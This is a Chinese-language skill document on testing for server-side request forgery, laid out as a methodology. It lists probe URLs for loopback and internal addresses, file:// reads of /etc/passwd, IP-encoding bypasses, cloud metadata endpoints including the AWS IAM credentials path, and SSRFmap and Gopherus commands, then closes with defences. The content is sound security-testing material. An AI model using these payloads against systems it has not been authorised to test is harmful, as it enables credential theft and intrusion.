---
name: ssrf-testing
description: SSRF服务器端请求伪造测试的专业技能和方法论
version: 1.0.0
---

# SSRF服务器端请求伪造测试

## 概述

SSRF（Server-Side Request Forgery）是一种利用服务器发起请求的漏洞，可以访问内网资源、进行端口扫描或绕过防火墙。

## 漏洞原理

应用程序接受URL参数并请求该URL，攻击者可以控制请求的目标，导致：
- 内网资源访问
- 本地文件读取
- 端口扫描
- 绕过防火墙
- 云服务元数据访问

## 测试方法

### 1. 识别SSRF输入点
- URL预览/截图、文件上传（远程URL）、Webhook回调、API代理、数据导入、图片处理、PDF生成

### 2. 基础检测
**测试本地回环：**
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
```

**测试内网IP：**
```
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
```

**测试文件协议：**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
```

### 3. 绕过技术
**IP地址编码：**
```
127.0.0.1 = 2130706433 (十进制)
127.0.0.1 = 0x7f000001 (十六进制)
```

**域名解析绕过：**
```
127.0.0.1.xip.io
127.0.0.1.nip.io
```

## 利用技术

### 云服务元数据
**AWS EC2：**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Google Cloud：**
```
http://metadata.google.internal/computeMetadata/v1/
```

**Azure：**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

## 工具使用

### SSRFmap
```bash
python3 ssrfmap.py -r request.txt -p url
python3 ssrfmap.py -r request.txt -p url -m portscan
python3 ssrfmap.py -r request.txt -p url -m cloud
```

### Gopherus
```bash
python gopherus.py --exploit redis
```

## 防护措施

1. **URL白名单** - 只允许特定域名
2. **禁用危险协议** - 只允许http/https，禁止file://、gopher://等
3. **IP地址过滤** - 检查是否为内网IP
4. **DNS解析验证** - 解析后验证IP是否内网
5. **网络隔离** - 限制服务器出网权限
